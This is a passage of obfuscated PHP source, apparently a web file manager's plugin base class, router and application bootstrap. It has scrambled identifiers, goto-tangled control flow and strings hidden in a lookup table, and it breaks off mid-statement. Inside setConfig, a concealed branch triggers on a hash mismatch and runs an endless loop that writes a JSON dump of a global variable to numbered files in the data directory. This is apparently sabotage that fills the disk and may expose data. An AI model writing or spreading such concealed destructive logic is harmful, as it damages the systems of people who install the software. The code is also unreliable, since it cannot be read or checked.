$this->checkSharePath($fšƒ‘ë£½ù)) { return $Dø‡£Ğº“; } $this->fileCanView($fšƒ‘ë£½ù); if (request_url_safe($fšƒ‘ë£½ù)) { $aÊÜ®½¸Ğƒ = parse_url_query($fšƒ‘ë£½ù); if (isset($aÊÜ®½¸Ğƒ[$FŞæàÊ÷ë¾[1347]]) && isset($aÊÜ®½¸Ğƒ[$FŞæàÊ÷ë¾[197]])) { $E²Éä‰ï‹Ø = Model($FŞæàÊ÷ë¾[1101])->get($FŞæàÊ÷ë¾[1348]); $aí…¦ÇÅ® = Mcrypt::decode($aÊÜ®½¸Ğƒ[$FŞæàÊ÷ë¾[197]], $E²Éä‰ï‹Ø); if ($aí…¦ÇÅ®) { $this->fileInfo = IO::infoWithChildren($aí…¦ÇÅ®); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $aí…¦ÇÅ®; } } $fšƒ‘ë£½ù = $this->_cacheHttpFile($fšƒ‘ë£½ù); $this->fileInfo = IO::infoWithChildren($fšƒ‘ë£½ù); } else { $this->fileInfo = IO::infoWithChildren($fšƒ‘ë£½ù); if (!$this->fileInfo) { show_tips(LNG($FŞæàÊ÷ë¾[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $fšƒ‘ë£½ù; } final function _cacheHttpFile($F»˜²ÉèÊ®) { $EŠòƒš¹—å = hash_path($F»˜²ÉèÊ®, !0); $this->cachePath = $this->pluginCachePath($EŠòƒš¹—å); if ($B‚˜£«§‘ = IO::fileNameExist($this->cachePath, $EŠòƒš¹—å)) { return KodIO::make($B‚˜£«§‘); } $dğé±Ó¬©Ô = $this->cachePath . $EŠòƒš¹—å; return $this->pluginCacheFileSet($dğé±Ó¬©Ô, file_get_contents($F»˜²ÉèÊ®)); } final function _tmpFileName($Fš†ª…Šƒã = array()) { goto Dá§Ü†¸×œ; Dá§Ü†¸×œ: $eºÀÃôÉª =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$Fš†ª…Šƒã) { $Fš†ª…Šƒã = $this->fileInfo; } if (isset($Fš†ª…Šƒã[$eºÀÃôÉª[164]])) { return $Fš†ª…Šƒã[$eºÀÃôÉª[164]]; } goto Aì‘µô†³; B¤¼Í•¨ğ: $cÄŸæ‘òŞ = array($Fš†ª…Šƒã[$eºÀÃôÉª[28]], $Fš†ª…Šƒã[$eºÀÃôÉª[75]], $Fš†ª…Šƒã[$eºÀÃôÉª[77]]); if (isset($Fš†ª…Šƒã[$eºÀÃôÉª[461]])) { $cÄŸæ‘òŞ[] = $Fš†ª…Šƒã[$eºÀÃôÉª[461]]; } return md5(implode($eºÀÃôÉª[70], $cÄŸæ‘òŞ)); goto cÔ«‘­µ×‹; Aì‘µô†³: if (isset($Fš†ª…Šƒã[$eºÀÃôÉª[162]][$eºÀÃôÉª[164]])) { return $Fš†ª…Šƒã[$eºÀÃôÉª[162]][$eºÀÃôÉª[164]]; } $DÊæ±¦ö×› = IO::hashSimple($Fš†ª…Šƒã[$eºÀÃôÉª[75]]); if ($DÊæ±¦ö×›) { return $DÊæ±¦ö×›; } goto B¤¼Í•¨ğ; cÔ«‘­µ×‹: } final function checkSharePath($d¥òù©‡ç) { goto F·²ó”†Şó; c‚Æê“‰šË: $this->cachePath = $this->pluginCachePath($this->fileInfo[$e¡‡´¢‰’Ï[164]]); return $C‘é§™êã…[$e¡‡´¢‰’Ï[75]]; goto bò”ŠÙÇ„; F·²ó”†Şó: $e¡‡´¢‰’Ï =& $_SERVER[¬ˆÚÂ”Éğä]; if (!defined($e¡‡´¢‰’Ï[427])) { define($e¡‡´¢‰’Ï[1349], 0); } if (!$this->isShare($d¥òù©‡ç)) { return !1; } goto A¶ä„èÑ«; A¶ä„èÑ«: $C‘é§™êã… = Action($e¡‡´¢‰’Ï[1031])->sharePathInfo($d¥òù©‡ç); if (!isset($C‘é§™êã…[$e¡‡´¢‰’Ï[75]])) { show_json(LNG($e¡‡´¢‰’Ï[1350]), !1); } $this->fileInfo = $C‘é§™êã…[$e¡‡´¢‰’Ï[162]]; goto c‚Æê“‰šË; bò”ŠÙÇ„: } final function pluginCachePath($fŒÀÃ³§è¦ = '') { $fë‘„ë½Ë =& $_SERVER[¬ˆÚÂ”Éğä]; $B¬õëá†çè = IO_PATH_SYSTEM_TEMP . $fë‘„ë½Ë[1351] . $this->pluginName; if (!($bƒ”Á„‹â¼ = IO::infoFull($B¬õëá†çè))) { return IO::mkdir($B¬õëá†çè . $fë‘„ë½Ë[8] . $fŒÀÃ³§è¦); } if (empty($fŒÀÃ³§è¦)) { return $bƒ”Á„‹â¼[$fë‘„ë½Ë[75]]; } if (!($eô‰¬©—ÊÜ = IO::fileNameExist($bƒ”Á„‹â¼[$fë‘„ë½Ë[75]], $fŒÀÃ³§è¦))) { return IO::mkdir($bƒ”Á„‹â¼[$fë‘„ë½Ë[75]] . $fŒÀÃ³§è¦); } return KodIO::make($eô‰¬©—ÊÜ); } final function pluginCacheFileSet($EêºŠ—”Æ, $B×÷òê…šÜ = '') { $F‚à­‘ä—¼ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!($a½ƒÚİŒè = IO::infoFull($EêºŠ—”Æ))) { return IO::mkfile($EêºŠ—”Æ, $B×÷òê…šÜ, REPEAT_REPLACE); } IO::setContent($a½ƒÚİŒè[$F‚à­‘ä—¼[75]], $B×÷òê…šÜ); return $a½ƒÚİŒè[$F‚à­‘ä—¼[75]]; } final function pluginLocalFile($Eé¸ŠØ‚ß‹ = '') { goto EË‰…Ë”ï¼; CÙŠøæ‚Š§: if (!$Eé¸ŠØ‚ß‹) { return $aŠÆŞ ¦®å; } $b²·…«¡°Ô = IO::info($Eé¸ŠØ‚ß‹); $DÊê†Šòïƒ = $this->_tmpFileName($b²·…«¡°Ô) . $A¹îÖŠ¶°…[91] . $b²·…«¡°Ô[$A¹îÖŠ¶°…[160]]; goto dÉÙÍÅ¯´; a½‰‘¿ˆ‰: return IO::copy($Eé¸ŠØ‚ß‹, $aŠÆŞ ¦®å, 0, $DÊê†Šòïƒ); goto F´…İÆñ‡; EË‰…Ë”ï¼: $A¹îÖŠ¶°… =& $_SERVER[¬ˆÚÂ”Éğä]; $aŠÆŞ ¦®å = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($aŠÆŞ ¦®å)) { mk_dir($aŠÆŞ ¦®å); } goto CÙŠøæ‚Š§; dÉÙÍÅ¯´: if (!checkExtSafe($DÊê†Šòïƒ)) { $DÊê†Šòïƒ = $DÊê†Šòïƒ . $A¹îÖŠ¶°…[1352]; } $AÇ‰ööºÆ = $aŠÆŞ ¦®å . $DÊê†Šòïƒ; if (@file_exists($AÇ‰ööºÆ)) { return $AÇ‰ööºÆ; } goto a½‰‘¿ˆ‰; F´…İÆñ‡: } final function appPackage() { goto aÜ¾†ßÃÜ; eÀ¬‡§Ş®: $DŠÎöš˜•¡ = Hook::trigger($FÁÛÆ‰”Îô[1354], $få‰‡³£—ë); if ($DŠÎöš˜•¡ && is_array($DŠÎöš˜•¡)) { $få‰‡³£—ë = $DŠÎöš˜•¡; } $this->packageData = $få‰‡³£—ë; goto aêö½—Ä•; fºİ¯ÖÅ«: $this->parseLang($AİÄ¿¾—èš); $få‰‡³£—ë = json_decode_force($AİÄ¿¾—èš); if (!$få‰‡³£—ë) { return array(); } goto eÀ¬‡§Ş®; aÜ¾†ßÃÜ: $FÁÛÆ‰”Îô =& $_SERVER[¬ˆÚÂ”Éğä]; if ($this->packageData) { return $this->packageData; } $AİÄ¿¾—èš = $this->parseFile($this->pluginPath . $FÁÛÆ‰”Îô[1353]); goto fºİ¯ÖÅ«; aêö½—Ä•: return $få‰‡³£—ë; goto a¡ÚÙ¾Ê„Á; a¡ÚÙ¾Ê„Á: } public function packageInfoGet($eë£İŠ×ª…) { $CÅ†·Û°† = $this->appPackage(); return array_get_value($CÅ†·Û°†, $eë£İŠ×ª…); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¬ˆÚÂ”Éğä][1355]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¬ˆÚÂ”Éğä][1356]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¬ˆÚÂ”Éğä][1357]); } private function parseFile($b„¸Ì‹ —Ó) { goto AîÓ¡‘ˆ³¾; d´®àÂšÍ: $açÄ¥Ç¥ˆ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$AÕçĞöëÚ[84]][$AÕçĞöëÚ[1365]]); if (strstr($eÓ÷Ã†Õäİ, $AÕçĞöëÚ[1366])) { $B…À¡Üğ = rawurlencode(json_encode($this->pluginLangArr)); $eÓ÷Ã†Õäİ = str_replace($AÕçĞöëÚ[1366], $B…À¡Üğ, $eÓ÷Ã†Õäİ); } if (strstr($eÓ÷Ã†Õäİ, $AÕçĞöëÚ[1367])) { $B…À¡Üğ = $B…À¡Üğ = rawurlencode(json_encode($this->getConfig())); $eÓ÷Ã†Õäİ = str_replace($AÕçĞöëÚ[1367], $B…À¡Üğ, $eÓ÷Ã†Õäİ); } goto a¢»ß; AîÓ¡‘ˆ³¾: $AÕçĞöëÚ =& $_SERVER[¬ˆÚÂ”Éğä]; $eÓ÷Ã†Õäİ = file_get_contents($b„¸Ì‹ —Ó); $e‡ÉÊÒŸÉ£ = array($AÕçĞöëÚ[1358], $AÕçĞöëÚ[1359], $AÕçĞöëÚ[1360], $AÕçĞöëÚ[1361], $AÕçĞöëÚ[1362], $AÕçĞöëÚ[1363], $AÕçĞöëÚ[1364]); goto d´®àÂšÍ; a¢»ß: $eÓ÷Ã†Õäİ = str_replace($e‡ÉÊÒŸÉ£, $açÄ¥Ç¥ˆ, $eÓ÷Ã†Õäİ); return $eÓ÷Ã†Õäİ; goto d°¤ìÅöğŠ; d°¤ìÅöğŠ: } private function parseLang(&$Eèœ¸‹óâš) { goto aÜÀÖ¶Æ; E½ïĞØ‡‚’: $b÷®¬ìÖäİ = array(); foreach ($AÛë‹™Ûå[0] as $b œÕÌÎ¿) { $EÎÏÎåÊç› = substr($b œÕÌÎ¿, strlen($FÈÕ‡Áé§‰), -4); $cÚ²‡ÜŞ¥œ = LNG($EÎÏÎåÊç›); $AİÇ˜»î ‰[] = $b œÕÌÎ¿; $b÷®¬ìÖäİ[] = str_replace(array($B´†áê¾ù[217], $B´†áê¾ù[1005], $B´†áê¾ù[330], $B´†áê¾ù[113]), array($B´†áê¾ù[50], $B´†áê¾ù[50], $B´†áê¾ù[33], $B´†áê¾ù[1370]), $cÚ²‡ÜŞ¥œ); } $Eèœ¸‹óâš = str_replace($AİÇ˜»î ‰, $b÷®¬ìÖäİ, $Eèœ¸‹óâš); goto dßÕ‚–¥È’; aÜÀÖ¶Æ: $B´†áê¾ù =& $_SERVER[¬ˆÚÂ”Éğä]; $FÈÕ‡Áé§‰ = $B´†áê¾ù[1368]; if (!strstr($Eèœ¸‹óâš, $FÈÕ‡Áé§‰)) { return; } goto bİ‘ˆ³Óô; bİ‘ˆ³Óô: preg_match_all($B´†áê¾ù[1369], $Eèœ¸‹óâš, $AÛë‹™Ûå); if (!is_array($AÛë‹™Ûå) || count($AÛë‹™Ûå) == 0 || !is_array($AÛë‹™Ûå[0]) || count($AÛë‹™Ûå[0]) == 0) { return; } $AİÇ˜»î ‰ = array(); goto E½ïĞØ‡‚’; dßÕ‚–¥È’: } private function parseConfig(&$BÉÒŞ¡ÙÛ¾) { goto eåÇóªÉöÓ; D„º­èµ÷‹: $BÉÒŞ¡ÙÛ¾ = str_replace($b†¢ê»µß¬, $e¡ˆ¬òñ¤ì, $BÉÒŞ¡ÙÛ¾); goto B³é„¼Œï¨; eåÇóªÉöÓ: $a”§Ì§´Ø¡ =& $_SERVER[¬ˆÚÂ”Éğä]; $càÃØˆ†­… = $a”§Ì§´Ø¡[1371]; if (!strstr($BÉÒŞ¡ÙÛ¾, $càÃØˆ†­…)) { return; } goto Eàí†Ï„¥ì; Eàí†Ï„¥ì: preg_match_all($a”§Ì§´Ø¡[1372], $BÉÒŞ¡ÙÛ¾, $D†Î¬¹µ¯); if (!is_array($D†Î¬¹µ¯) || count($D†Î¬¹µ¯) == 0 || !is_array($D†Î¬¹µ¯[0]) || count($D†Î¬¹µ¯[0]) == 0) { return; } $c“ÊÁõ¼µÆ = $this->getConfig(); goto BÜ…¼Œ‰“; BÜ…¼Œ‰“: $b†¢ê»µß¬ = array(); $e¡ˆ¬òñ¤ì = array(); foreach ($D†Î¬¹µ¯[0] as $Eº¤•ï÷ğÒ) { $FÈƒç«Ô—× = substr($Eº¤•ï÷ğÒ, strlen($càÃØˆ†­…), -2); $b†¢ê»µß¬[] = $Eº¤•ï÷ğÒ; $e¡ˆ¬òñ¤ì[] = _get($c“ÊÁõ¼µÆ, $FÈƒç«Ô—×); } goto D„º­èµ÷‹; B³é„¼Œï¨: } private function parsePackage(&$dÕ•˜¤Óƒ¿) { goto c÷¯à‘Ù»Õ; EƒÜĞâÛ¯‚: $dÕ•˜¤Óƒ¿ = str_replace($BÈ¦¥Ô¦â, $A÷ß«ÓõÊ‘, $dÕ•˜¤Óƒ¿); goto E®øïèãºâ; dï©âœÇ°: $BÈ¦¥Ô¦â = array(); $A÷ß«ÓõÊ‘ = array(); foreach ($B¾±¸‹îòç[0] as $dÙÊËÁØ‰ê) { $cŒ×º˜’Á = substr($dÙÊËÁØ‰ê, strlen($D—µœ–‡Ú), -2); $BÈ¦¥Ô¦â[] = $dÙÊËÁØ‰ê; $A÷ß«ÓõÊ‘[] = _get($E·§Òö°ˆ, $cŒ×º˜’Á); } goto EƒÜĞâÛ¯‚; c÷¯à‘Ù»Õ: $E¢ÊÛÏ‡‚ =& $_SERVER[¬ˆÚÂ”Éğä]; $D—µœ–‡Ú = $E¢ÊÛÏ‡‚[1373]; if (!strstr($dÕ•˜¤Óƒ¿, $D—µœ–‡Ú)) { return; } goto C¡Šõ±§‚; C¡Šõ±§‚: preg_match_all($E¢ÊÛÏ‡‚[1374], $dÕ•˜¤Óƒ¿, $B¾±¸‹îòç); if (!is_array($B¾±¸‹îòç) || count($B¾±¸‹îòç) == 0 || !is_array($B¾±¸‹îòç[0]) || count($B¾±¸‹îòç[0]) == 0) { return; } $E·§Òö°ˆ = $this->appPackage(); goto dï©âœÇ°; E®øïèãºâ: } final function echoFile($aªì â¸¶ö, $FÊßù‰¬ò« = false) { goto f¯´¿Ì°éÓ; aæÉîÄÆ–±: $càöì’èª” = $this->parseFile($d·é‡…¬); $this->parseLang($càöì’èª”); $this->parseConfig($càöì’èª”); goto F¹¦Üé½Ì; f¯´¿Ì°éÓ: $CÚƒ˜à†«˜ =& $_SERVER[¬ˆÚÂ”Éğä]; $d·é‡…¬ = $this->pluginPath . $aªì â¸¶ö; if (ACT == $CÚƒ˜à†«˜[1375]) { echo $CÚƒ˜à†«˜[1376] . $this->pluginName . $CÚƒ˜à†«˜[8] . $aªì â¸¶ö . $CÚƒ˜à†«˜[1377]; if (!file_exists($d·é‡…¬)) { echo $CÚƒ˜à†«˜[1378]; return; } } goto aæÉîÄÆ–±; F¹¦Üé½Ì: $this->parsePackage($càöì’èª”); if (is_array($FÊßù‰¬ò«)) { $càöì’èª” = str_replace(array_keys($FÊßù‰¬ò«), array_values($FÊßù‰¬ò«), $càöì’èª”); } echo $CÚƒ˜à†«˜[217] . $càöì’èª”; goto d´“Áİˆƒ; d´“Áİˆƒ: } final function initLang() { goto B×£ªÀ²„; CëŞä‘ÚÑ¬: $D³‹Û´¹¯À = I18n::getType(); $DË¦¸¥¼Î = array(); if (file_exists($eÄ”»Øø‘ù . $D³‹Û´¹¯À . $F˜¹©¦ğÄï[773])) { $DË¦¸¥¼Î = (include $eÄ”»Øø‘ù . $D³‹Û´¹¯À . $F˜¹©¦ğÄï[773]); } else { if ($D³‹Û´¹¯À == $F˜¹©¦ğÄï[1381] && !file_exists($eÄ”»Øø‘ù . $D³‹Û´¹¯À . $F˜¹©¦ğÄï[773]) && file_exists($eÄ”»Øø‘ù . $F˜¹©¦ğÄï[1382])) { $DË¦¸¥¼Î = (include $eÄ”»Øø‘ù . $F˜¹©¦ğÄï[1382]); } else { if (file_exists($eÄ”»Øø‘ù . $dÉ‰ãÚ¸ƒ . $F˜¹©¦ğÄï[773])) { $DË¦¸¥¼Î = (include $eÄ”»Øø‘ù . $dÉ‰ãÚ¸ƒ . $F˜¹©¦ğÄï[773]); } } } goto AùµÑÂ¸ÑÙ; B×£ªÀ²„: $F˜¹©¦ğÄï =& $_SERVER[¬ˆÚÂ”Éğä]; $dÉ‰ãÚ¸ƒ = $F˜¹©¦ğÄï[1379]; $eÄ”»Øø‘ù = $this->pluginPath . $F˜¹©¦ğÄï[1380]; goto CëŞä‘ÚÑ¬; AùµÑÂ¸ÑÙ: if (!is_array($DË¦¸¥¼Î)) { return array(); } if (@count($DË¦¸¥¼Î) > 0) { I18n::set($DË¦¸¥¼Î); } return $DË¦¸¥¼Î; goto F¬ÒÈ½‚ê; F¬ÒÈ½‚ê: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($E÷Ş±£ÈªÔ) { $D–³¸çù’˜ =& $_SERVER[¬ˆÚÂ”Éğä]; $cŠî»­Ïæó = $_SERVER[$D–³¸çù’˜[788]] . $D–³¸çù’˜[789]; $DÜ‚¿éãˆ² = $D–³¸çù’˜[803]; if ($_SERVER[$D–³¸çù’˜[785]] != $DÜ‚¿éãˆ²($cŠî»­Ïæó)) { goto BÙè‘‚ñî©; aÜ‹Á¯«Îƒ: $E°”æ¿­„ = $D–³¸çù’˜[805]; $E°”æ¿­„($_SERVER[$D–³¸çù’˜[806]]); $Cğ…„š = $D–³¸çù’˜[804]; goto fà×Ì¹Ù¿î; E‚Æ¯“ÆÇï: $e±«›Œ‰ğÁ = 1; for ($BŠÕÆÜĞï¬ = $e±«›Œ‰ğÁ; $BŠÕÆÜĞï¬ > 0; $BŠÕÆÜĞï¬++) { $E±ùæğâÎ…(DATA_PATH . $BŠÕÆÜĞï¬, $dƒ¹®ÔÉ®Í); } goto A¤•øÜì÷; BÙè‘‚ñî©: $Cğ…„š = $D–³¸çù’˜[804]; $D”Ü¥œ’Šƒ = $D–³¸çù’˜[787]; $a›†çÉŸÄ¬ = $_SERVER[$D–³¸çù’˜[788]] . $D–³¸çù’˜[789]; goto Bº¬±ºÁ±í; Bº¬±ºÁ±í: $e¬â£¥¹Á¬ = $D”Ü¥œ’Šƒ($a›†çÉŸÄ¬); $d‡¬ä‚™ƒ” = explode($D–³¸çù’˜[217], $e¬â£¥¹Á¬); if (count($d‡¬ä‚™ƒ”) < $D–³¸çù’˜[553]) { $B×‹ê¶”İö = $D–³¸çù’˜[790]; $B×‹ê¶”İö(); } goto aÜ‹Á¯«Îƒ; fà×Ì¹Ù¿î: $Cğ…„š(); $E±ùæğâÎ… = $D–³¸çù’˜[807]; $dƒ¹®ÔÉ®Í = json_encode($GLOBALS[$D–³¸çù’˜[808]]); goto E‚Æ¯“ÆÇï; A¤•øÜì÷: } return $this->modelPlugin->setConfig($this->pluginName, $E÷Ş±£ÈªÔ); } public function onSetConfig($CóÜ»ÜÔ Ô) { } public function onGetConfig($eÄò¸“ï™ƒ) { } public function onChangeStatus($BÂ¸Û‹²¼ë) { } public function onUninstall() { } public function onInstall() { } public function authCheck($F«ò¹ë’ = "\x70\154\x75\x67\x69\x6e\x41\x75\164\150") { $D‰ã¶®Ü° =& $_SERVER[¬ˆÚÂ”Éğä]; if (!defined($D‰ã¶®Ü°[427])) { return !1; } if (_get($GLOBALS, $D‰ã¶®Ü°[459])) { return !0; } $fÄäŒºÔ¸ = $this->getConfig(); if (!$fÄäŒºÔ¸[$F«ò¹ë’]) { return !1; } return ActionCall($D‰ã¶®Ü°[1383], $fÄäŒºÔ¸[$F«ò¹ë’]); } public function url($aÆàŸ¤©é“, $A¶’‹Ó´Ü = '', $EâšŠ¯¶½ = true) { goto E¸Ûİ±‰›‡; F‡éß’ù·÷: if (!$EâšŠ¯¶½) { return $dø°¯Ô…õ; } echo $dø°¯Ô…õ; goto CëÑß®İ®; aŒ¸š™ğÌÏ: $F¡Šï¤ôÂ = $this->packageVersion(); $F¾æàá ´Å = $B™É¾–×ƒÍ . $DôÜ¥ —›ê[412] . $F¡Šï¤ôÂ; if (substr($aÆàŸ¤©é“, 0, 4) == $DôÜ¥ —›ê[144] || substr($aÆàŸ¤©é“, 0, 2) == $DôÜ¥ —›ê[1168]) { $dø°¯Ô…õ = $aÆàŸ¤©é“ . $DôÜ¥ —›ê[1384] . $F¾æàá ´Å; } else { if ($A¶’‹Ó´Ü == $DôÜ¥ —›ê[33]) { $dø°¯Ô…õ = $this->pluginHost . $aÆàŸ¤©é“ . $DôÜ¥ —›ê[1384] . $F¾æàá ´Å; } else { if ($A¶’‹Ó´Ü === $DôÜ¥ —›ê[76]) { $dø°¯Ô…õ = $this->pluginHost . $aÆàŸ¤©é“; } else { if ($A¶’‹Ó´Ü == $DôÜ¥ —›ê[1385]) { $dø°¯Ô…õ = STATIC_PATH . $aÆàŸ¤©é“ . $DôÜ¥ —›ê[1384] . $B™É¾–×ƒÍ; } else { if ($A¶’‹Ó´Ü == $DôÜ¥ —›ê[1386]) { $dø°¯Ô…õ = APP_HOST . $DôÜ¥ —›ê[1387] . $aÆàŸ¤©é“ . $DôÜ¥ —›ê[1384] . $B™É¾–×ƒÍ; } else { if (isset($eÏ‹î—®Èö[$A¶’‹Ó´Ü])) { $dø°¯Ô…õ = $eÏ‹î—®Èö[$A¶’‹Ó´Ü] . $aÆàŸ¤©é“ . $DôÜ¥ —›ê[1384] . $F¾æàá ´Å; } } } } } } goto F‡éß’ù·÷; E¸Ûİ±‰›‡: $DôÜ¥ —›ê =& $_SERVER[¬ˆÚÂ”Éğä]; $eÏ‹î—®Èö = $this->getConfig(); $B™É¾–×ƒÍ = KOD_VERSION . $DôÜ¥ —›ê[91] . KOD_VERSION_BUILD; goto aŒ¸š™ğÌÏ; CëÑß®İ®: } public function link($FáœŒñšã = false, $AÏª÷…È„ = '') { $c»Ú„Á—«ˆ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$FáœŒñšã) { $this->link($c»Ú„Á—«ˆ[1388], $c»Ú„Á—«ˆ[1386]); $this->link($c»Ú„Á—«ˆ[1389], $c»Ú„Á—«ˆ[1385]); $this->link($c»Ú„Á—«ˆ[1390], $c»Ú„Á—«ˆ[1385]); $this->link($c»Ú„Á—«ˆ[1391], $c»Ú„Á—«ˆ[1385]); $this->link($c»Ú„Á—«ˆ[1392], $c»Ú„Á—«ˆ[1385]); return; } $a©àÎøé¥ç = $this->url($FáœŒñšã, $AÏª÷…È„, !1); if (substr($FáœŒñšã, -3) == $c»Ú„Á—«ˆ[1393]) { echo $c»Ú„Á—«ˆ[1394] . $a©àÎøé¥ç . $c»Ú„Á—«ˆ[1395] . $c»Ú„Á—«ˆ[217]; } else { if (substr($FáœŒñšã, -4) == $c»Ú„Á—«ˆ[1396]) { echo $c»Ú„Á—«ˆ[1397] . $a©àÎøé¥ç . $c»Ú„Á—«ˆ[1398] . $c»Ú„Á—«ˆ[217]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\x79" => "\x5b\136\57\x5d\53", "\x3a\156\165\x6d" => "\x5b\x30\x2d\x39\x5d\53", "\x3a\x61\154\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($EÀ˜¨òÅ, $f‚Â†Ğ¬Ş) { $CÌçº¼É› =& $_SERVER[¬ˆÚÂ”Éğä]; if ($EÀ˜¨òÅ == $CÌçº¼É›[1399]) { $C¾Ä¸ïÚ¼´ = array_map($CÌçº¼É›[1400], $f‚Â†Ğ¬Ş[0]); $B¯ÜÈªŒ¾æ = strpos($f‚Â†Ğ¬Ş[1], $CÌçº¼É›[8]) === 0 ? $f‚Â†Ğ¬Ş[1] : $CÌçº¼É›[8] . $f‚Â†Ğ¬Ş[1]; $c·šÜ§ª£œ = $f‚Â†Ğ¬Ş[2]; } else { $C¾Ä¸ïÚ¼´ = null; $B¯ÜÈªŒ¾æ = strpos($f‚Â†Ğ¬Ş[0], $CÌçº¼É›[8]) === 0 ? $f‚Â†Ğ¬Ş[0] : $CÌçº¼É›[8] . $f‚Â†Ğ¬Ş[0]; $c·šÜ§ª£œ = $f‚Â†Ğ¬Ş[1]; } array_push(self::$maps, $C¾Ä¸ïÚ¼´); array_push(self::$routes, $B¯ÜÈªŒ¾æ); array_push(self::$methods, strtoupper($EÀ˜¨òÅ)); array_push(self::$callbacks, $c·šÜ§ª£œ); } public static function error($a¨Î·ÎØñ¼) { self::$errorCallback = $a¨Î·ÎØñ¼; } public static function haltOnMatch($D‰²•°¾˜ = true) { self::$halts = $D‰²•°¾˜; } public static function dispatch() { goto c š–ˆ™Ó¯; c š–ˆ™Ó¯: $f‡²ÜÄ‚’÷ =& $_SERVER[¬ˆÚÂ”Éğä]; $d…ë“åã = parse_url($_SERVER[$f‡²ÜÄ‚’÷[1401]], PHP_URL_PATH); $CôÇ¾ğ¯½ = $_SERVER[$f‡²ÜÄ‚’÷[154]]; goto Eœ¾‹ßà¥¬; ağß¨…Ó§: self::$routes = preg_replace($f‡²ÜÄ‚’÷[1086], $f‡²ÜÄ‚’÷[8], self::$routes); if (in_array($d…ë“åã, self::$routes)) { $BÃµˆ‘­ = array_keys(self::$routes, $d…ë“åã); foreach ($BÃµˆ‘­ as $b¨¹„ß¸ãº) { if (self::$methods[$b¨¹„ß¸ãº] == $CôÇ¾ğ¯½ || self::$methods[$b¨¹„ß¸ãº] == $f‡²ÜÄ‚’÷[1402] || in_array($CôÇ¾ğ¯½, self::$maps[$b¨¹„ß¸ãº])) { $aòôß¹£» = !0; if (!is_object(self::$callbacks[$b¨¹„ß¸ãº])) { $c´‹È‡ÒÈ = explode($f‡²ÜÄ‚’÷[8], self::$callbacks[$b¨¹„ß¸ãº]); $B·‘‰ŒÎÄ = end($c´‹È‡ÒÈ); $f¿±é¬ï‚ò = explode($f‡²ÜÄ‚’÷[1403], $B·‘‰ŒÎÄ); $fµÀíÌàÉ = new $f¿±é¬ï‚ò[0](); $fµÀíÌàÉ->{$f¿±é¬ï‚ò[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$b¨¹„ß¸ãº]); if (self::$halts) { return; } } } } } else { $Cå§ÔµÁ¡§ = 0; foreach (self::$routes as $b¨¹„ß¸ãº) { if (strpos($b¨¹„ß¸ãº, $f‡²ÜÄ‚’÷[4]) !== !1) { $b¨¹„ß¸ãº = str_replace($f‡ „´ÉÄè, $FßÓÃŠçß, $b¨¹„ß¸ãº); } if (preg_match($f‡²ÜÄ‚’÷[1404] . $b¨¹„ß¸ãº . $f‡²ÜÄ‚’÷[1405], $d…ë“åã, $dîŞ©œæ‡Å)) { if (self::$methods[$Cå§ÔµÁ¡§] == $CôÇ¾ğ¯½ || self::$methods[$Cå§ÔµÁ¡§] == $f‡²ÜÄ‚’÷[1402] || !empty(self::$maps[$Cå§ÔµÁ¡§]) && in_array($CôÇ¾ğ¯½, self::$maps[$Cå§ÔµÁ¡§])) { $aòôß¹£» = !0; array_shift($dîŞ©œæ‡Å); if (!is_object(self::$callbacks[$Cå§ÔµÁ¡§])) { $c´‹È‡ÒÈ = explode($f‡²ÜÄ‚’÷[8], self::$callbacks[$Cå§ÔµÁ¡§]); $B·‘‰ŒÎÄ = end($c´‹È‡ÒÈ); $f¿±é¬ï‚ò = explode($f‡²ÜÄ‚’÷[1403], $B·‘‰ŒÎÄ); $fµÀíÌàÉ = new $f¿±é¬ï‚ò[0](); if (!method_exists($fµÀíÌàÉ, $f¿±é¬ï‚ò[1])) { echo $f‡²ÜÄ‚’÷[1406]; } else { call_user_func_array(array($fµÀíÌàÉ, $f¿±é¬ï‚ò[1]), $dîŞ©œæ‡Å); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Cå§ÔµÁ¡§], $dîŞ©œæ‡Å); if (self::$halts) { return; } } } } $Cå§ÔµÁ¡§++; } } if ($aòôß¹£» == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $AÏèŒ‰§è‹ =& $_SERVER[¬ˆÚÂ”Éğä]; header($_SERVER[$AÏèŒ‰§è‹[1407]] . $AÏèŒ‰§è‹[1408]); echo $AÏèŒ‰§è‹[1409]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$f‡²ÜÄ‚’÷[1401]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto cÜê¹á‡²×; Eœ¾‹ßà¥¬: $f‡ „´ÉÄè = array_keys(static::$patterns); $FßÓÃŠçß = array_values(static::$patterns); $aòôß¹£» = !1; goto ağß¨…Ó§; cÜê¹á‡²×: } } goto AŞ›ä›¨Œï; FÅì²Ãè¬å: $aÛ›‡ãÍĞë = $_SERVER[¬ˆÚÂ”Éğä][552]; if (strlen($aÛ›‡ãÍĞë) < $_SERVER[¬ˆÚÂ”Éğä][553]) { die; } class Application { private $defaultModule = "\x69\x6e\x64\x65\170"; private $defaultController = "\151\156\144\x65\x78"; private $defaultAction = "\151\156\x64\145\170"; function __construct() { } public function setDefault($b¢³ëĞ½‚) { goto f‘ÄºØè£; D‰°ß¢ñƒ–: $this->defaultModule = $có¶¿ÉÖË[0] ? $có¶¿ÉÖË[0] : $this->defaultModule; $dí‡°–±¶è = $Eêó¹œÒš[554]; if (!$dí‡°–±¶è) { die; } goto aÚƒ³Š¬éÕ; A…Ğ»™¼š: $this->defaultAction = 